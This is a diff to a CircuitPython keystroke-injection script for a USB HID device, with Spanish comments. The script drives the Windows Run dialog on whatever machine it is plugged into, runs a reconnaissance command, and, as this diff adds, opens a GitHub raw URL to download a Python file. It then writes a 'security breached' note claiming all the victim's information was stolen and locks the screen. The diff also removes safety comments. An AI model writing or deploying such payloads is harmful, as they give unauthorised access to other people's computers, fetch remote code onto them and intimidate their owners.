@@ -6,7 +6,7 @@ from adafruit_hid.keyboard_layout_win_es import KeyboardLayout
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayout(kbd) 
 
-time.sleep(5) # Delay de seguridad
+time.sleep(5)
 
 kbd.press(Keycode.GUI, Keycode.R)
 kbd.release_all()
@@ -17,7 +17,18 @@ layout.write(cmd_recon)
 kbd.press(Keycode.ENTER)
 kbd.release_all()
 
-time.sleep(5.0)
+time.sleep(4.0)
+
+kbd.press(Keycode.GUI, Keycode.R)
+kbd.release_all()
+time.sleep(0.5)
+
+URL_DESCARGA = "https://github.com/ZIREAEL314/Prueba-mk1/raw/refs/heads/main/Data,%20message%20and%20block.py"
+layout.write(URL_DESCARGA)
+kbd.press(Keycode.ENTER)
+kbd.release_all()
+
+time.sleep(1.0)
 
 kbd.press(Keycode.GUI, Keycode.R)
 kbd.release_all()
@@ -26,11 +37,11 @@ time.sleep(0.5)
 layout.write("cmd /c \"echo. > %temp%\\SEGURIDAD_VULNERADA.txt && notepad %temp%\\SEGURIDAD_VULNERADA.txt\"") 
 kbd.press(Keycode.ENTER)
 kbd.release_all()
-time.sleep(1.5) # Esperar a que el sistema procese y abra
+time.sleep(1.5) 
 
-# --- INGRESE SU MENSAJE AQUÍ ---
 layout.write("GRACIAS POR PERMITIR MI ACCESO, TODA TU INFORMACION FUE ROBADA :)")
-time.sleep(3.0)
+time.sleep(1.5)
 kbd.press(Keycode.GUI,Keycode.L)
 kbd.release_all()
+
 
